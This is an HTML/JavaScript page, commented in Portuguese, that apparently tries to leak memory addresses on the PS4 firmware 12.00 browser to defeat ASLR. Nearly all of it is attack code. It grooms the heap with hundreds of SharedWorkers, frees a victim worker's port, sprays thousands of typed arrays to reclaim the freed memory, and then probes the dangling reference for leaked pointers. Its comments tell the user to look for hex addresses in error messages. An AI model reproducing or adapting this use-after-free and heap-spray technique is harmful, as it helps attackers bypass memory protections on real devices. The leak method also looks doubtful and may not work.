<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 ASLR Hunter</title>
    
</head>
<body>

    <h1>PS4 12.00 - ASLR LEAK HUNTER</h1>
    <h3>Objetivo: Encontrar um Ponteiro de Memória Dinâmico</h3>
    <div id="status">Pronto.</div>
    <div id="log"></div>
    <br>
    <button onclick="start_hunter()">INICIAR SONDAGEM</button>

    <script>
        function log(msg, type="") {
            var d = document.getElementById("log");
            d.innerHTML += `<div class="${type}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            d.scrollTop = d.scrollHeight;
        }

        // =================================================================
        // 1. ESTRUTURA DE SONDA (PROBE)
        // =================================================================
        function build_probe_object() {
            var size = 0x400; 
            var buffer = new Uint32Array(size / 4);
            
            // PADRÃO DE LEITURA:
            // Não queremos executar, queremos confundir o motor JS.
            // Colocamos valores que parecem ponteiros JS (Tagged Pointers)
            // 0x00000000 = NULL
            // 0x00020000 = Smi (Small Integer)
            
            // Vamos deixar buracos propositais (0x00) para ver se o Kernel
            // escreve algo lá antes de lermos.
            
            for(var i=0; i<buffer.length; i++) {
                if (i % 8 === 0) buffer[i] = 0x41414141; // Marcador
                else buffer[i] = 0x00000000; // Espaço vazio para leak
            }
            return buffer;
        }

        // =================================================================
        // 2. EXECUÇÃO
        // =================================================================
        var workers_stash = [];

        async function start_hunter() {
            if(!window.SharedWorker) return log("Navegador incompatível.");
            
            var payload = build_probe_object();
            log("Sonda construída.", "info");

            // FASE 1: GROOMING
            log("Estabilizando Heap (400)...");
            for(let i=0; i<400; i++) {
                try {
                    let w = new SharedWorker("data:text/javascript,1", "g"+i);
                    w.port.start();
                    workers_stash.push(w);
                } catch(e){}
            }

            // FASE 2: TRIGGER (404)
            var p_count = 0;
            var it = setInterval(() => {
                if(p_count >= 4) {
                    clearInterval(it);
                    probe_memory(payload);
                    return;
                }
                let w = new SharedWorker("data:text/javascript,1", "v"+p_count);
                w.port.start();
                workers_stash.push(w);
                p_count++;
            }, 150);
        }

        function probe_memory(payload) {
            log("!!! DISPARANDO SONDAGEM !!!", "warn");
            document.getElementById("status").innerText = "SONDANDO...";

            // 1. Vítima
            var victim = workers_stash.pop();
            // Guardamos referências para propriedades ANTES de fechar
            var p_ref = victim.port; 

            // 2. FREE
            victim.port.close();
            
            // 3. SPRAY (Reclaim)
            // Tenta colocar nossa estrutura cheia de zeros no lugar
            var spray = [];
            for(var k=0; k<5000; k++) {
                spray.push(new Uint32Array(payload));
            }

            // 4. LEITURA (A Mágica)
            // Tentamos acessar o objeto 'morto'. Se nossa estrutura de zeros estiver lá,
            // o navegador pode interpretar um 0x0000 ou um ponteiro residual como um objeto válido.
            
            try {
                log("Lendo propriedades do objeto zumbi...");
                
                // Tenta forçar o JS a nos dar uma string de erro contendo endereços
                // Às vezes o toString() de um objeto corrompido vaza o ponteiro!
                var dump = p_ref.toString();
                log("ToString: " + dump);

                // Tenta inspecionar eventos
                console.log(p_ref); 
                
                // Tenta acessar propriedades internas que podem ter sido sobrescritas
                // Se conseguirmos ler um número que não é 0x41414141 nem 0, é um LEAK.
                
            } catch(e) {
                log("Exceção capturada: " + e, "leak");
                // Analise a mensagem de erro!
                // Se o erro for "Access violation at 0x824...", VOCÊ ACHOU O LEAK!
            }

            // Teste de Sobrevivência
            setTimeout(() => {
                log("Se o console não desligou, tente ler o log acima com atenção.");
                log("Procure por números hexadecimais em erros.");
                alert("Verifique o Log por endereços de memória!");
            }, 5000);
        }
    </script>
</body>
</html>
